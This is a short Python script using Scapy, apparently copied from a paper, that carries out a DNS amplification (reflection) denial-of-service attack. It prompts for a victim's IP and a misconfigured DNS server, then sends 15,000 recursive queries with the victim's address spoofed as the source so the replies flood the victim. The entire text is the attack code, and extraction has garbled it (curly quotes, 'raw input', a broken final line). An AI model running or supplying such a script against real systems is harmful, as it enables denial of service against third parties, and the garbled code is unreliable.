#!/ usr/bin/python
# next two lines are used to remove warning of ipv6

import logging
logging.getLogger(”scapy.runtime”).setLevel(logging.ERROR)

from scapy.all import ∗

# taking input the victim ’ s and DNS server ’ s address

victimIP = raw input(”Please enter the IP address for the victim:”)
dnsIP = raw input(”Please enter the IP address for the misconfigured DNS:”)

i=0

# creating a layer 3 socket at ethernet interface

s = conf.L3socket(iface=’eth0’)

# continuously sending DNS requests
while (i < 15000):
	s.send(IP(dst=dnsIP,src=victimIP)/UDP(sport=5353, dport=53)/DNS(rd=1,qd=DNSQR
	(qname=”google .com”))) i=i +1;